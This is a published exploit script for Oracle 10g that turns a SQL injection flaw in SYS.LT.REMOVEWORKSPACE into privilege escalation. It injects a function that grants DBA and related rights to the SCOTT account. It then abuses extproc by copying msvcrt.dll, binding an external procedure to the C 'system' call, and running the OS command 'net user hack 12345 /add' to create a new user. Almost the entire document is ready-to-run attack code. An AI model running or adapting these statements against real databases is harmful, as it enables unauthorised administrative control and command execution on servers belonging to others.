Oracle 10g SYS.LT.REMOVEWORKSPACE SQL Injection Exploit
=======================================================



/*********************************************************/
/*Oracle 10g SYS.LT.REMOVEWORKSPACE SQL Injection Exploit*/
/****grant DBA and create new  OS user (advanced extproc)*/
/*********************************************************/
/***********exploit grant DBA to scott********************/
/***********and execute OS command "net user"*************/
/***********using advanced extproc method*****************/
/*********************************************************/
/***********tested on oracle 10.1.0.5.0*******************/
/*********************************************************/
/*********************************************************/
/* Date of Public EXPLOIT: January 6, 2009               */
/* Written by:             Alexandr "Sh2kerr" Polyakov   */
/* email:                  Alexandr.Polyakov@dsec.ru     */
/* site:                   http://www.dsecrg.ru          */
/*			   http://www.dsec.ru            */
/*********************************************************/
/*Original Advisory:                                     */
/*Esteban Martinez Fayo [Team SHATTER ]                  */
/*Date of Public Advisory: November 11, 2008             */
/*http://www.appsecinc.com/resources/alerts/oracle/2008-10.shtml*/
/*********************************************************/


select * from user_role_privs;

CREATE OR REPLACE FUNCTION X return varchar2
authid current_user as
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE &#039;GRANT DBA TO SCOTT&#039;;
EXECUTE IMMEDIATE &#039;GRANT CREATE ANY DIRECTORY TO SCOTT&#039;;
EXECUTE IMMEDIATE &#039;GRANT CREATE ANY LIBRARY TO SCOTT&#039;;
EXECUTE IMMEDIATE &#039;GRANT EXECUTE ON SYS.DBMS_FILE_TRANSFER TO SCOTT&#039;;
COMMIT;
RETURN &#039;X&#039;;
END;
/

exec SYS.LT.CREATEWORKSPACE(&#039;sh2kerr&#039;&#039; and SCOTT.X()=&#039;&#039;X&#039;);
exec SYS.LT.REMOVEWORKSPACE(&#039;sh2kerr&#039;&#039; and SCOTT.X()=&#039;&#039;X&#039;);

/* bypassing extproc limitation by copying msvcrt.dll to $ORACLE_HOME\BIN */
/* this method works in 10g and 11g database versions with updates        */

CREATE OR REPLACE DIRECTORY copy_dll_from AS &#039;C:\Windows\system32&#039;;
CREATE OR REPLACE DIRECTORY copy_dll_to AS   &#039;C:\Oracle\product\10.1.0\db_1\BIN&#039;;

BEGIN
  SYS.DBMS_FILE_TRANSFER.COPY_FILE(
   source_directory_object      => &#039;copy_dll_from&#039;,
   source_file_name             => &#039;msvcrt.dll&#039;,
   destination_directory_object => &#039;copy_dll_to&#039;,
   destination_file_name        => &#039;msvcrt.dll&#039;);
END;
/

CREATE OR REPLACE LIBRARY extproc_shell AS &#039;C:\Oracle\product\10.1.0\db_1\bin\msvcrt.dll&#039;;
/

CREATE OR REPLACE PROCEDURE extprocexec (cmdstring IN CHAR)
IS EXTERNAL
NAME "system"
LIBRARY extproc_shell
LANGUAGE C;
/

/* here we can paste any OS command for example create new user */

EXEC extprocexec(&#039;net user hack 12345 /add&#039;);
/

select * from user_role_privs;



